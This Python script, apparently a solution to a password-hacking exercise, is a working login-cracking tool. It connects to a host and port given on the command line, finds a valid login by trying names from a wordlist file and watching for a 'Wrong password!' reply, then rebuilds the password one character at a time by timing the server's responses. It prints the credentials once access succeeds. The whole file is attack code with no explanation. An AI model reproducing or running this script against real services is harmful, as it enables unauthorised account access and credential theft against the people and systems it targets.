import socket
import sys
import json
import string
from datetime import datetime

def main():
    script, hostname, port = sys.argv
    address = (hostname, int(port))
    credential_dict = {"login": " ", "password": " "}
    i = 0
    possible_chars = string.ascii_letters + string.digits

    with socket.socket() as client_socket:
        client_socket.connect(address)
        for login in generate_names():
            credential_dict['login'] = login
            credentials = json.dumps(credential_dict)
            client_socket.send(credentials.encode())
            response = json.loads(client_socket.recv(1024).decode())
            if response['result'] == 'Wrong password!':
                break

        while True:
            for char in possible_chars:
                passk = list(credential_dict['password'])
                try:
                    passk[i] = char
                except IndexError:
                    passk.append(char)
                credential_dict['password'] = ''.join(passk)
                credentials = json.dumps(credential_dict)
                client_socket.send(credentials.encode())
                start = datetime.now()
                response = json.loads(client_socket.recv(1024).decode())
                end = datetime.now()
                difference = (end - start).total_seconds()
                if difference >= 0.1:
                    i += 1
                    break
                if response['result'] == 'Connection success!':
                    print(credentials)
                    break
            if response['result'] == 'Connection success!':
                break


def generate_names():
    file_path = "hacking\logins.txt"
    with open(file_path, 'r') as f:
        names = f.read().split()
        for name in names:
            yield name


def intable(s):
    try:
        int(s)
        return True
    except ValueError:
        return False


if __name__ == '__main__':
    main()